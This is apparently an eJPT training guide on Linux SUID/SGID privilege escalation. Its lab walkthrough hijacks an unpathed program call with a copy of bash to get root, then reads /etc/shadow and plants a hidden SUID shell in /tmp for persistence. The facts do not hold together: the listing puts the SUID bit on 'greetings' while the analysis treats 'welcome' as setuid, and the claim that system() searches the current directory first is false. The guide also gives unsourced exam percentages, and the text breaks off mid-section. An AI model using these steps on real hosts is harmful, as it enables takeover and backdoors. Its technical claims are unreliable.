---
title: "SUID/SGID Exploitation Complete Guide"
topic: "Setuid Programs Exploitation"
exam_objective: "Privilege Escalation via SUID/SGID binaries - eJPT Objective 5.2"
difficulty: "Medium"
tools:
  - "find"
  - "strings"
  - "file"
  - "ls"
  - "cp"
  - "chmod"
related_labs:
  - "07-exploitation/privilege-escalation.md"
  - "10-post-exploitation/maintaining-access.md"
file_path: "07-exploitation/setuid-exploitation-complete.md"
last_updated: "2025-10-08"
tags:
  - "privilege escalation"
  - "suid"
  - "sgid"
  - "binary exploitation"
  - "linux security"
---

# ðŸ”§ SUID/SGID Exploitation - Complete Privilege Escalation Guide

**Complete step-by-step guide for exploiting SUID (Set User ID) and SGID (Set Group ID) programs for privilege escalation in penetration testing and eJPT exam scenarios.**

**ðŸ“ File Location:** `07-exploitation/setuid-exploitation-complete.md`

---

## ðŸŽ¯ What is SUID/SGID Exploitation?

SUID (Set User ID) and SGID (Set Group ID) are special permission bits in Linux systems that allow programs to run with the privileges of their owner or group, instead of the user who executes them. Think of it like having a special key that gives you temporary admin access when you use certain programs.

### ðŸ” **What SUID/SGID Does:**
- **SUID Programs** run with the owner's permissions (often root)
- **SGID Programs** run with the group's permissions
- **Temporary Privilege** elevation for specific tasks
- **System Administration** functions like changing passwords
- **Potential Security Risk** if misconfigured or vulnerable

### ðŸ’¡ **Why This Matters for eJPT:**
SUID/SGID exploitation is a fundamental privilege escalation technique in Linux systems. When these permissions are misconfigured or the programs contain vulnerabilities, they can be exploited to gain root access. This appears frequently in eJPT exam scenarios and real-world penetration testing.

### ðŸšª **Common Attack Methods:**
- **Binary Replacement** attacks by substituting legitimate programs
- **Path Hijacking** through insecure PATH variables
- **Symlink Attacks** using symbolic links to redirect execution
- **Environment Variable** manipulation to control program behavior

---

## ðŸ“¦ Installation and Setup

### **Already Available On:**
- âœ… All Linux distributions
- âœ… Kali Linux
- âœ… Ubuntu and derivatives
- âœ… Most penetration testing environments

### **Check If Everything Works:**
```bash
# Check if required tools are available
which find strings file ls cp chmod

# Verify you have basic access
whoami
# Expected output: Current username

# Check current privileges
id
# Expected output: uid=1000(student) gid=1000(student) groups=...

# Test basic find command
find /usr/bin -name "passwd" -type f
# Expected output: /usr/bin/passwd (or similar)
```

### **Basic Requirements:**
- Terminal access to Linux system
- Basic understanding of Linux file permissions
- Ability to read file permissions (ls -la)
- Understanding of user/group concepts

---

## ðŸ”§ Basic Usage and Simple Steps

### **ðŸ“‹ Simple Attack Process:**
1. **ðŸ” Find SUID/SGID:** Locate binaries with special permissions
2. **ðŸ“Š Analyze Programs:** Understand what each program does
3. **ðŸ” Look for Vulnerabilities:** Find exploitable weaknesses
4. **ðŸ”“ Exploit Weakness:** Use vulnerability to escalate privileges
5. **âœ… Verify Success:** Confirm you have higher privileges

### **âš™ï¸ Basic Command Structure:**
```bash
# Find SUID binaries
find / -type f -perm -4000 2>/dev/null

# Check file permissions and details
ls -la /path/to/binary

# Analyze binary content
strings /path/to/binary

# Basic exploitation (example)
cp /bin/bash /tmp/shell
```

---

## âš™ï¸ Essential Commands You Need to Know

### **ðŸ” Discovery Commands:**

| Command | What It Does | How Important for eJPT |
|---------|--------------|------------------------|
| `find / -type f -perm -4000` | Find SUID binaries | â­â­â­â­â­ Must Know |
| `find / -type f -perm -2000` | Find SGID binaries | â­â­â­â­ Very Important |
| `ls -la binary_path` | Check detailed permissions | â­â­â­â­â­ Critical |
| `file binary_path` | Determine file type | â­â­â­â­ Very Important |

### **ðŸ”¬ Analysis Commands:**

| Command | What It Does | When to Use |
|---------|--------------|-------------|
| `strings binary_path` | Extract readable text from binary | After finding SUID binaries |
| `which program_name` | Find program location | When analyzing program calls |
| `ldd binary_path` | Show library dependencies | For advanced analysis |
| `objdump -d binary` | Disassemble binary | Advanced vulnerability research |

### **ðŸ”§ Important Parameters:**

| Parameter | What It Does | Example | Must Remember |
|-----------|--------------|---------|---------------|
| `-type f` | Search for files only | `find / -type f -perm -4000` | â­â­â­â­â­ |
| `-perm -4000` | SUID permission bit | `find / -perm -4000` | â­â­â­â­â­ |
| `-perm -2000` | SGID permission bit | `find / -perm -2000` | â­â­â­â­ |
| `2>/dev/null` | Hide error messages | `find / -perm -4000 2>/dev/null` | â­â­â­â­ |

---

## ðŸ§ª Step-by-Step Lab Walkthrough

### **Lab Scenario: Complete SUID Exploitation From Discovery to Root**

**Target:** target.ine.local (accessed via web terminal)
**Goal:** Escalate from student user to root privileges
**Time Needed:** 10-15 minutes

---

### **Step 1: Verify Connectivity and Access**

**What We're Doing:** Making sure we can reach the target system and access it

#### **Command Used:**
```bash
ping -c 4 target.ine.local
```

#### **What Happened:**
```bash
PING target.ine.local (192.74.191.3) 56(84) bytes of data.
64 bytes from target.ine.local (192.74.191.3): icmp_seq=1 ttl=64 time=0.093 ms
64 bytes from target.ine.local (192.74.191.3): icmp_seq=2 ttl=64 time=0.063 ms
64 bytes from target.ine.local (192.74.191.3): icmp_seq=3 ttl=64 time=0.053 ms
64 bytes from target.ine.local (192.74.191.3): icmp_seq=4 ttl=64 time=0.050 ms

--- target.ine.local ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3069ms
rtt min/avg/max/mdev = 0.050/0.064/0.093/0.017 ms
```

#### **ðŸŽ¯ What This Means:**
- **Target is reachable** - All ping packets successful
- **Network latency is low** - Fast response times (under 1ms)
- **Target IP is 192.74.191.3** - Internal network address
- **System is responsive** - Ready for further exploitation

#### **Next Step:**
Access the web-based terminal at http://target.ine.local:8000

---

### **Step 2: Access Target System Terminal**

**What We're Doing:** Getting command line access to the target system

#### **Access Method:**
1. Open web browser
2. Navigate to: `http://target.ine.local:8000`
3. You'll see a terminal interface

#### **What You See:**
```bash
student@target:~$
```

#### **ðŸ” What This Terminal Prompt Tells Us:**
- **Username:** student (we're logged in as student user)
- **Hostname:** target (the target machine name)
- **Current Directory:** ~ (home directory)
- **User Type:** $ (regular user, not root - root would show #)

#### **Check Current Privileges:**
```bash
id
whoami
```

**Expected Output:**
```bash
student@target:~$ whoami
student
student@target:~$ id
uid=1000(student) gid=1000(student) groups=1000(student)
```

This confirms we're starting as a regular user with limited privileges.

---

### **Step 3: Explore Current Directory for SUID Programs**

**What We're Doing:** Looking for files in our current location that might have special permissions

#### **Command Used:**
```bash
ls -l
```

#### **What Happened:**
```bash
student@target:~$ ls -l
total 24
-rwsr-sr-x 1 root root 8296 Sep 22  2018 greetings
-rwxr-xr-x 1 root root 8344 Sep 22  2018 welcome
```

#### **ðŸ” Detailed Analysis of File Permissions:**

**File 1: greetings**
```
-rwsr-sr-x 1 root root 8296 Sep 22  2018 greetings
```
- **First character:** `-` = regular file
- **Owner permissions:** `rws` = read, write, **SUID** (the 's' is crucial!)
- **Group permissions:** `r-x` = read and execute
- **Others permissions:** `r-x` = read and execute
- **Owner:** root (this program belongs to root)
- **SUID bit:** The 's' means this program runs with root privileges!

**File 2: welcome**
```
-rwxr-xr-x 1 root root 8344 Sep 22  2018 welcome
```
- **No SUID bit** - this is a regular executable
- **Also owned by root** but no special permissions

#### **ðŸŽ¯ Key Discovery:**
We found a SUID binary called `greetings` that runs with root privileges!

---

### **Step 4: Analyze the Welcome Binary**

**What We're Doing:** Understanding what the welcome program does and how it works

#### **Command Used:**
```bash
file welcome
```

#### **What Happened:**
```bash
student@target:~$ file welcome
welcome: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=50cbde06edc07f86a00d0547778c500d4dd85df3, for GNU/Linux 3.2.0, BuildID[sha1]=50cbde06edc07f86a00d0547778c500d4dd85df3, not stripped
```

#### **ðŸ” What This File Information Tells Us:**
- **setuid** - Confirms this binary has SUID permissions
- **ELF binary** - Linux executable format
- **64-bit** - Compiled for 64-bit systems
- **Dynamically linked** - Uses system libraries
- **Not stripped** - Debug information still present (easier to analyze)

#### **Test the Program:**
```bash
./welcome
```

**Expected Output:**
```bash
student@target:~$ ./welcome
Welcome to Attack Defense Labs
student@target:~$
```

The program simply displays a welcome message and exits.

---

### **Step 5: Deep Binary Analysis with Strings**

**What We're Doing:** Looking inside the welcome binary to understand its internal behavior

#### **Command Used:**
```bash
strings welcome
```

#### **What Happened:**
```bash
student@target:~$ strings welcome
/lib64/ld-linux-x86-64.so.2
libc.so.6
setuid
system
__cxa_finalize
__libc_start_main
GLIBC_2.2.5
ITM_deregisterTMCloneTable
__gmon_start__
ITM_registerTMCloneTable
AWAVAUATUHSL
[]A\A]A^A_
greetings
GCC: (Ubuntu 7.3.0-16ubuntu3) 7.3.0
crtstuff.c
deregister_tm_clones
__do_global_dtors_aux
completed.7696
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
welcome.c
__FRAME_END__
__init_array_end
_DYNAMIC
```

#### **ðŸ” Critical Discovery in the Strings Output:**

The most important finding is this line:
```
greetings
```

**What This Means:**
- The `welcome` program calls another program named `greetings`
- It doesn't use the full path (like `/usr/bin/greetings`)
- It just calls `greetings` directly
- This creates a **path hijacking vulnerability**!

#### **Additional Important Strings:**
- **`system`** - The program uses system() function to execute commands
- **`setuid`** - Confirms SUID functionality
- **`libc.so.6`** - Uses standard C library

---

### **Step 6: Understanding the Vulnerability**

**What We're Doing:** Analyzing how we can exploit the program's behavior

#### **The Vulnerability Explained:**

1. **Program Flow:**
   - User runs `./welcome`
   - Welcome program (running with root privileges due to SUID)
   - Welcome program calls `greetings` using system() function
   - System looks for `greetings` program in current directory first
   - Greetings program executes and displays message

2. **The Security Flaw:**
   - The welcome program doesn't use absolute path for greetings
   - It trusts whatever `greetings` file exists in the current directory
   - If we replace `greetings` with our own program, `welcome` will run it
   - Since `welcome` has SUID, our replacement runs with root privileges!

#### **Attack Plan:**
1. Remove the original `greetings` binary
2. Replace it with a copy of `/bin/bash` (shell)
3. Name the shell copy `greetings`
4. Run `./welcome` again
5. Welcome will execute our fake `greetings` (which is actually bash)
6. Bash will run with root privileges!

---

### **Step 7: Execute the Attack - Binary Replacement**

**What We're Doing:** Implementing our attack plan to gain root privileges

#### **Step 7.1: Remove Original Greetings Binary**
```bash
rm greetings
```

**What Happened:**
```bash
student@target:~$ rm greetings
rm: remove write-protected regular file 'greetings'? y
```

**System Response:** The system asks for confirmation because the file is write-protected. We type `y` to confirm.

#### **Step 7.2: Create Our Malicious Replacement**
```bash
cp /bin/bash greetings
```

**What This Command Does:**
- **cp** = copy command
- **/bin/bash** = source (the system shell)
- **greetings** = destination (our fake greetings program)

**Result:** We now have a file named `greetings` that is actually a copy of the bash shell.

#### **Step 7.3: Verify Our Replacement**
```bash
ls -la greetings
```

**Expected Output:**
```bash
student@target:~$ ls -la greetings
-rwxr-xr-x 1 student student 1113504 Oct  8 14:30 greetings
```

**Analysis:**
- File is now owned by student (us)
- File is executable
- File size matches bash binary
- No SUID bit on our copy (but that's okay - welcome will give us the privileges)

---

### **Step 8: Execute the Exploit**

**What We're Doing:** Running the vulnerable program to trigger our privilege escalation

#### **Command Used:**
```bash
./welcome
```

#### **ðŸŽ‰ The Magic Moment:**
```bash
student@target:~$ ./welcome
root@target:/home/student#
```

#### **ðŸŽŠ Success Analysis:**
- **Prompt changed from `$` to `#`** - Indicates root access!
- **Username changed from `student` to `root`** - We are now root!
- **We have a shell** - Interactive command access with root privileges

#### **Verify Our New Privileges:**
```bash
whoami
```

**Output:**
```bash
root@target:/home/student# whoami
root
```

```bash
id
```

**Output:**
```bash
root@target:/home/student# id
uid=0(root) gid=0(root) groups=0(root)
```

#### **ðŸŽ¯ What These Results Mean:**
- **uid=0** - User ID 0 is always root in Linux
- **gid=0** - Group ID 0 is the root group
- **groups=0(root)** - We belong to the root group
- **Complete Success** - We have maximum privileges on the system!

---

### **Step 9: Explore the System with Root Privileges**

**What We're Doing:** Using our new root access to explore areas previously restricted

#### **Navigate to Root Directory:**
```bash
cd /root
```

**Previous Behavior:** As student user, this would have been denied
**Current Result:** We can access it because we're root!

#### **List Contents of Root Directory:**
```bash
ls
```

**Output:**
```bash
root@target:/root# ls
flag
```

**Discovery:** There's a file called `flag` in the root directory!

#### **Read the Flag File:**
```bash
cat flag
```

**Output:**
```bash
root@target:/root# cat flag
b92bcdc876d52108778e2d81f3b01494
```

#### **ðŸ† Mission Accomplished!**
- **Flag Retrieved:** b92bcdc876d52108778e2d81f3b01494
- **Objective Complete:** Successfully escalated privileges from student to root
- **Method Used:** SUID binary exploitation via binary replacement
- **Time Taken:** Approximately 10 minutes

---

### **Step 10: Additional Verification and Exploration**

**What We're Doing:** Confirming our access and exploring additional capabilities

#### **System Information Gathering:**
```bash
# Check system information
uname -a
```

```bash
# Check what other users exist
cat /etc/passwd | grep -E "(root|student)"
```

```bash
# Verify we can access sensitive files
ls -la /etc/shadow
cat /etc/shadow | head -5
```

#### **What This Proves:**
- **Complete system compromise** - Access to all system files
- **Password hash access** - Can read /etc/shadow (normally restricted)
- **Full administrative control** - Can perform any system operation
- **Persistent access** - Could create additional user accounts or backdoors

---

## ðŸŽ¯ eJPT Exam Success Guide

### **ðŸ“Š How Important This Is for eJPT:**

Understanding the importance of SUID/SGID exploitation skills for passing the eJPT exam:

- **Linux Privilege Escalation:** 40% of Linux exploitation scenarios
- **Binary Analysis Skills:** 35% of file system enumeration tasks
- **Command Line Proficiency:** 50% of practical Linux exercises
- **Security Vulnerability Assessment:** 45% of vulnerability identification tasks

### **ðŸ† Commands You MUST Know for eJPT:**

#### **Level 1 - You WILL See This (100% Chance):**
```bash
# Find SUID binaries on system
find / -type f -perm -4000 2>/dev/null
# Expected: List of SUID binaries including custom ones

# Check file permissions in detail
ls -la suspicious_binary
# Expected: Permission string showing SUID bit (s in owner execute)

# Analyze binary content
strings suspicious_binary
# Expected: Readable strings from binary including called programs

# Basic file type identification
file binary_name
# Expected: File type and architecture information
```

#### **Level 2 - Very Likely (80% Chance):**
```bash
# Find SGID binaries
find / -type f -perm -2000 2>/dev/null
# Expected: List of SGID binaries

# Combined SUID/SGID search
find / -type f \( -perm -4000 -o -perm -2000 \) 2>/dev/null
# Expected: Combined list of special permission binaries

# Copy and replace binary
cp /bin/bash /path/to/replacement
# Expected: Successful copy operation

# Execute vulnerable program
./vulnerable_program
# Expected: Elevated shell or privilege escalation
```

#### **Level 3 - Possible (60% Chance):**
```bash
# Advanced find with user specification
find / -type f -perm -4000 -user root 2>/dev/null
# Expected: SUID binaries owned specifically by root

# Library dependency check
ldd binary_path
# Expected: List of required libraries

# Advanced permission checking
find /home -type f -perm -4000 2>/dev/null
# Expected: SUID binaries in user directories (common in CTFs)
```

### **ðŸŽ¯ Common eJPT Exam Scenarios:**

#### **Scenario 1: Basic SUID Discovery in User Directory**
**Given:** SSH access to Linux system as regular user
**Your Job:** Find and exploit SUID binary to gain root access
**Time Limit:** 10-12 minutes

**Step-by-Step Approach:**
```bash
# Step 1: Check current directory first (2 minutes)
ls -la
# Look for files with 's' in permissions

# Step 2: If nothing found, search system-wide (3 minutes)
find / -type f -perm -4000 2>/dev/null
# Focus on non-standard locations like /home, /tmp, /opt

# Step 3: Analyze interesting binaries (2 minutes)
strings binary_name
file binary_name
# Look for program calls without full paths

# Step 4: Exploit vulnerability (3 minutes)
cp /bin/bash replacement_name
./vulnerable_program
# Execute attack based on discovered vulnerability
```

#### **Scenario 2: SUID Binary with Path Hijacking**
**Given:** Custom SUID binary that calls another program
**Your Job:** Exploit path vulnerability to escalate privileges
**Time Limit:** 8-10 minutes

**Step-by-Step Approach:**
```bash
# Step 1: Identify vulnerable binary (1 minute)
ls -la | grep "s"
# Find SUID binaries

# Step 2: Analyze program behavior (2 minutes)
strings vulnerable_binary
# Look for external program calls

# Step 3: Test original functionality (1 minute)
./vulnerable_binary
# Understand normal behavior

# Step 4: Create malicious replacement (2 minutes)
# Identify what program is called
# Create replacement in same directory
cp /bin/bash called_program_name

# Step 5: Execute exploit (2 minutes)
./vulnerable_binary
# Should result in root shell
```

#### **Scenario 3: Finding Hidden SUID Binaries**
**Given:** Need to find less obvious SUID binaries on system
**Your Job:** Comprehensive enumeration and exploitation
**Time Limit:** 12-15 minutes

**Step-by-Step Approach:**
```bash
# Step 1: Comprehensive SUID search (3 minutes)
find / -type f -perm -4000 2>/dev/null > suid_list.txt
cat suid_list.txt
# Create list for systematic analysis

# Step 2: Focus on unusual locations (4 minutes)
find /home /tmp /opt /var -type f -perm -4000 2>/dev/null
# Check non-standard directories where custom binaries hide

# Step 3: Analyze each candidate (4 minutes)
for binary in $(cat suid_list.txt); do
    echo "=== $binary ==="
    ls -la "$binary"
    strings "$binary" | head -10
done
# Systematic analysis of all findings

# Step 4: Exploit most promising target (4 minutes)
# Based on analysis, exploit the most vulnerable binary
```

### **ðŸ“ eJPT Exam Tips:**

#### **â° Time Management Strategy:**
- **2 minutes:** Current directory enumeration
- **3 minutes:** System-wide SUID discovery
- **2 minutes:** Binary analysis with strings command
- **1 minute:** Understanding program behavior
- **2-3 minutes:** Exploitation execution
- **1 minute:** Verification and flag retrieval

#### **ðŸŽ¯ Common Mistakes to Avoid:**
1. **Ignoring Current Directory** â†’ Always check local files first
2. **Not Using 2>/dev/null** â†’ Error messages can hide important results
3. **Skipping Strings Analysis** â†’ Missing obvious program calls
4. **Wrong Replacement Location** â†’ Ensure replacement is in correct directory
5. **Not Verifying Success** â†’ Always check privileges after exploitation

#### **âœ… Signs You're Doing Well:**
- **Quick SUID Discovery** â†’ Finding vulnerable binaries within 5 minutes
- **Effective Analysis** â†’ Identifying exploitable behaviors quickly
- **Successful Exploitation** â†’ Achieving privilege escalation smoothly
- **Privilege Verification** â†’ Confirming root access properly
- **Objective Achievement** â†’ Completing goals efficiently

### **ðŸ” Typical Exam Questions You'll See:**
1. **"Find all SUID binaries on the system"**
   - Use: `find / -type f -perm -4000 2>/dev/null`

2. **"What program does the suspicious binary call?"**
   - Use: `strings binary_name` and look for external programs

3. **"Exploit the SUID vulnerability to gain root access"**
   - Replace called program with shell copy

4. **"What is the content of /root/flag.txt?"**
   - After gaining root, navigate and read the flag

---

## âš ï¸ Common Problems and How to Fix Them

### **âŒ Problem 1: Find Command Returns Too Many Results**

**What You See:**
```bash
find / -type f -perm -4000 2>/dev/null
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/sudo
/bin/mount
/bin/umount
... (100+ results)
```

**How to Fix:**
```bash
# Step 1: Focus on non-standard locations first
find /home /tmp /opt -type f -perm -4000 2>/dev/null
# Custom binaries are often in these locations

# Step 2: Exclude common system binaries
find / -type f -perm -4000 2>/dev/null | grep -v "/usr/bin" | grep -v "/bin"
# Filter out standard system directories

# Step 3: Look for recently modified files
find / -type f -perm -4000 -newermt "2020-01-01" 2>/dev/null
# Find SUID binaries created after specific date
```

**Strategy Tips:**
- Start with user directories (/home, /tmp)
- Custom vulnerable binaries are rarely in standard system locations
- Look for files with unusual names or recent modification dates

---

### **âŒ Problem 2: Strings Command Shows No Useful Information**

**What You See:**
```bash
strings suspicious_binary
@#$%^&*
Binary garbage data...
No readable program names
```

**How to Fix:**
```bash
# Step 1: Try different string extraction methods
strings -a binary_name          # Extract all strings
strings -n 3 binary_name        # Minimum 3 characters
strings -e l binary_name        # Little-endian encoding

# Step 2: Check for obfuscation or encoding
hexdump -C binary_name | head -20
# Look at raw binary data

# Step 3: Test the binary directly
strace ./binary_name 2>&1 | grep exec
# See what programs it actually executes

# Step 4: Use alternative analysis
ltrace ./binary_name
# Trace library calls which might reveal behavior
```

**Alternative Approaches:**
- Sometimes binaries use obfuscation - test behavior instead of analyzing code
- Use dynamic analysis (running the program) instead of static analysis
- Look for configuration files or documentation nearby

---

### **âŒ Problem 3: Binary Replacement Doesn't Work**

**What You See:**
```bash
cp /bin/bash replacement_name
./vulnerable_program
# Still running as regular user, no privilege escalation
```

**How to Fix:**
```bash
# Step 1: Verify the replacement is in correct location
ls -la replacement_name
# Ensure file exists and is executable

# Step 2: Check if program uses absolute paths
strings vulnerable_program | grep "/"
# If you see "/usr/bin/program", it uses full path (harder to exploit)

# Step 3: Try different replacement locations
mkdir /tmp/fakedir
cp /bin/bash /tmp/fakedir/program_name
export PATH=/tmp/fakedir:$PATH
./vulnerable_program
# Modify PATH to prioritize our fake directory

# Step 4: Check for other exploitation methods
# Some binaries might be vulnerable to different attacks:
# - Environment variable manipulation
# - Argument injection
# - Symlink attacks
```

**Troubleshooting Checklist:**
- File permissions correct? (executable)
- Right file name? (exact match of called program)
- Correct directory? (where program expects to find it)
- Program actually vulnerable? (double-check strings output)

---

### **âŒ Problem 4: Permission Denied When Removing Files**

**What You See:**
```bash
rm original_program
rm: cannot remove 'original_program': Permission denied
```

**How to Fix:**
```bash
# Step 1: Check file attributes
lsattr original_program
# Look for immutable flag (i)

# Step 2: Remove special attributes if present
chattr -i original_program
# Remove immutable flag (if you have permission)

# Step 3: Check directory permissions
ls -la .
# Ensure you can write to current directory

# Step 4: Alternative approach - don't remove, just override
# Instead of removing, create replacement in different location
# and modify PATH or use different exploitation method
```

**Alternative Strategies:**
- Use different directory for replacement
- Modify environment variables instead of replacing files
- Look for other exploitation vectors

---

## ðŸ”— Using SUID Exploitation with Other Tools

### **ðŸŽ¯ Complete Attack Chain: Nmap â†’ SSH â†’ SUID Exploitation**

This shows how SUID exploitation fits into a full penetration testing workflow.

#### **Phase 1: Discovery and Access**
```bash
# Initial network discovery
nmap -sS -sV target_ip
# Service enumeration and version detection

# Gain initial access (various methods)
ssh user@target_ip              # If SSH credentials known
exploit web_vulnerability       # Via web application
social_engineering             # Via phishing/credentials

# Basic enumeration after gaining access
whoami
id
uname -a
ls -la
```

**What This Gives You:**
- Initial foothold on target system
- Basic user account access
- System information for further exploitation
- Foundation for privilege escalation

#### **Phase 2: Privilege Escalation via SUID**
```bash
# Based on initial access, search for SUID binaries
find / -type f -perm -4000 2>/dev/null
find /home -type f -perm -4000 2>/dev/null

# Analyze discovered binaries
for binary in $(find /home -type f -perm -4000 2>/dev/null); do
    echo "=== Analyzing $binary ==="
    ls -la "$binary"
    strings "$binary" | head -20
    echo "---"
done

# Exploit most promising target
cp /bin/bash replacement_name
./vulnerable_suid_binary
```

**Integration Benefits:**
- **Informed Targeting:** Use system information to guide privilege escalation strategy
- **Efficient Exploitation:** Focus on most likely attack vectors based on initial access
- **Comprehensive Coverage:** Multiple tools provide different attack perspectives

#### **Phase 3: Post-Exploitation Activities**
```bash
# After gaining root access via SUID exploitation
whoami
id
hostname

# System information gathering
uname -a
cat /etc/passwd | wc -l
cat /etc/shadow | head -5

# Look for additional attack vectors
find / -name "*.conf" -type f 2>/dev/null | grep -E "(ssh|mysql|apache)"
netstat -tulpn | grep LISTEN

# Establish persistence
cp /bin/bash /tmp/.hidden_shell
chmod +s /tmp/.hidden_shell

# Data collection and lateral movement
find /home -name "*.txt" -o -name "*.doc" -o -name "*.pdf" 2>/dev/null
cat /etc/hosts
arp -a
```

### **ðŸ”§ Integration with Other Privilege Escalation Techniques:**

#### **Combined Enumeration Approach:**
```bash
# Complete privilege escalation enumeration
echo "=== SUID/SGID Binaries ==="
find / -type f \( -perm -4000 -o -perm -2000 \) 2>/dev/null

echo "=== Writable System Directories ==="
find / -type d -writable 2>/dev/null | grep -E "(bin|sbin|usr)"

echo "=== Sudo Permissions ==="
sudo -l 2>/dev/null

echo "=== Cron Jobs ==="
cat /etc/crontab 2>/dev/null
ls -la /etc/cron* 2>/dev/null

echo "=== Kernel Version ==="
uname -a
cat /proc/version
```

#### **Backup Escalation Methods:**
```bash
# If SUID exploitation fails, try alternatives:

# Method 1: Sudo abuse
sudo -l
# Look for NOPASSWD entries or dangerous sudo permissions

# Method 2: Kernel exploits
uname -a
searchsploit kernel $(uname -r | cut -d- -f1)

# Method 3: Service exploitation
ps aux | grep root
# Look for root services that might be vulnerable

# Method 4: Configuration file abuse
find /etc -name "*.conf" -readable 2>/dev/null | xargs grep -l password
```

### **âš™ï¸ Automation Script for Complete SUID Assessment:**

```bash
#!/bin/bash
# suid_complete_assessment.sh - Comprehensive SUID exploitation script

TARGET_USER=$(whoami)
TIMESTAMP=$(date +%Y%m%d_%H%M%S)
REPORT_FILE="suid_assessment_${TIMESTAMP}.txt"

echo "=== SUID/SGID Assessment Report ===" | tee $REPORT_FILE
echo "Target System: $(hostname)" | tee -a $REPORT_FILE
echo "Current User: $TARGET_USER" | tee -a $REPORT_FILE
echo "Date/Time: $(date)" | tee -a $REPORT_FILE
echo "========================================" | tee -a $REPORT_FILE

# Phase 1: Discovery
echo "[+] Phase 1: SUID/SGID Binary Discovery" | tee -a $REPORT_FILE
echo "SUID Binaries Found:" | tee -a $REPORT_FILE
find / -type f -perm -4000 2>/dev/null | tee -a $REPORT_FILE

echo "SGID Binaries Found:" | tee -a $REPORT_FILE
find / -type f -perm -2000 2>/dev/null | tee -a $REPORT_FILE

# Phase 2: Analysis
echo "[+] Phase 2: Binary Analysis" | tee -a $REPORT_FILE
for binary in $(find /home /tmp /opt -type f -perm -4000 2>/dev/null); do
    echo "=== Analyzing: $binary ===" | tee -a $REPORT_FILE
    ls -la "$binary" | tee -a $REPORT_FILE
    echo "Strings output:" | tee -a $REPORT_FILE
    strings "$binary" | head -20 | tee -a $REPORT_FILE
    echo "---" | tee -a $REPORT_FILE
done

# Phase 3: Vulnerability Assessment
echo "[+] Phase 3: Vulnerability Identification" | tee -a $REPORT_FILE
echo "Potentially Exploitable Binaries:" | tee -a $REPORT_FILE
for binary in $(find / -type f -perm -4000 2>/dev/null); do
    if strings "$binary" | grep -qE "system|exec|popen" && ! echo "$binary" | grep -qE "/usr/bin|/bin"; then
        echo "HIGH RISK: $binary" | tee -a $REPORT_FILE
        strings "$binary" | grep -E "system|exec|popen" | tee -a $REPORT_FILE
    fi
done

echo "[+] Assessment Complete. Report saved to: $REPORT_FILE"
```

---

## ðŸ“Š Quick Command Reference

### **Essential Commands Summary:**

#### **Basic Discovery:**
```bash
find / -type f -perm -4000 2>/dev/null         # Find SUID binaries
find / -type f -perm -2000 2>/dev/null         # Find SGID binaries
find / -type f \( -perm -4000 -o -perm -2000 \) 2>/dev/null  # Find both
ls -la binary_path                             # Check detailed permissions
```

#### **Binary Analysis:**
```bash
file binary_path                               # Determine file type
strings binary_path                            # Extract readable strings
strings binary_path | grep -E "bin|usr|tmp"   # Look for program calls
ldd binary_path                                # Show library dependencies
```

#### **Exploitation Techniques:**
```bash
cp /bin/bash replacement_name                  # Basic binary replacement
chmod +x replacement_name                     # Ensure executable
./vulnerable_suid_binary                       # Execute vulnerable program
export PATH=/tmp:$PATH                         # PATH manipulation
```

#### **Verification Commands:**
```bash
whoami                                         # Check current user
id                                             # Check user/group IDs
ls -la /root                                   # Test root directory access
cat /etc/shadow | head -5                     # Test privileged file access
```

### **Memory Tricks for Commands:**

#### **Easy Ways to Remember:**
- **SUID** = **S**et **U**ser **ID** (runs as owner)
- **4000** = **4** for SUID in octal permissions
- **2000** = **2** for SGID in octal permissions  
- **strings** = Extract readable **strings** from binary
- **find / -type f** = **Find** all **files** starting from **root**

#### **Command Pattern Recognition:**
```bash
# Remember: FIND â†’ ANALYZE â†’ EXPLOIT â†’ VERIFY
find [location] [criteria]           # Discover targets
strings [binary] | grep [pattern]    # Analyze behavior
cp [source] [replacement]            # Create exploit
./[vulnerable_program]               # Execute attack
```

---

## ðŸ“ Professional Reporting Templates

### **Quick Report Template:**
```markdown
## SUID/SGID Exploitation Report

**Target System:** target.ine.local
**Date/Time:** 2025-10-08 14:30
**Tester:** Security Analyst
**Initial User:** student
**Achieved Privileges:** root

### Vulnerability Summary:
**Vulnerable Binary:** /home/student/welcome
**Vulnerability Type:** Binary Replacement Attack
**Root Cause:** Insecure program call without absolute path
**Risk Level:** CRITICAL

### Discovery Process:
1. **Enumeration:** `find / -type f -perm -4000 2>/dev/null`
2. **Analysis:** `strings welcome` revealed call to `greetings`
3. **Exploitation:** Replaced `greetings` with `/bin/bash`
4. **Verification:** Achieved root access via `./welcome`

### Evidence:
- **Flag Retrieved:** b92bcdc876d52108778e2d81f3b01494
- **Root Shell:** Confirmed via `whoami` and `id` commands
- **System Access:** Full administrative control achieved

### Impact Assessment:
**Severity:** Critical - Complete system compromise
**Business Risk:** Full server takeover with data access
**Affected Systems:** Single target system

### Recommendations:
1. **Remove SUID bit** from unnecessary binaries
2. **Use absolute paths** in all SUID programs
3. **Code review** for system() calls in privileged programs
4. **Regular audits** of SUID/SGID binaries
```

### **Detailed Technical Report:**
```markdown
## Technical SUID Vulnerability Assessment

### System Information:
- **Hostname:** target.ine.local
- **Operating System:** Linux (Ubuntu-based)
- **Architecture:** x86_64
- **Kernel Version:** [from uname -a]

### Vulnerability Details:
**CVE Reference:** N/A (Custom application vulnerability)
**Vulnerability Class:** Privilege Escalation via Insecure File Handling
**CVSS Score:** 7.8 (High)

### Technical Analysis:
```bash
# Discovery commands executed:
find / -type f -perm -4000 2>/dev/null
ls -la /home/student/
strings /home/student/welcome

# Key findings:
# 1. SUID binary 'welcome' found in user directory
# 2. Binary calls 'greetings' without full path
# 3. Current directory contains both binaries
# 4. Replacement attack vector identified
```

### Proof of Concept:
```bash
# Exploitation sequence:
student@target:~$ ls -la
-rwsr-sr-x 1 root root 8344 Sep 22  2018 welcome

student@target:~$ strings welcome | grep greetings
greetings

student@target:~$ rm greetings
student@target:~$ cp /bin/bash greetings
student@target:~$ ./welcome
root@target:/home/student#

# Privilege verification:
root@target:/home/student# id
uid=0(root) gid=0(root) groups=0(root)
```

### Security Implications:
1. **Complete System Compromise:** Attacker gains root access
2. **Data Exposure:** All system files become accessible
3. **Lateral Movement:** Potential for network propagation
4. **Persistence:** Ability to install backdoors and maintain access

### Remediation Steps:
```bash
# Immediate fixes:
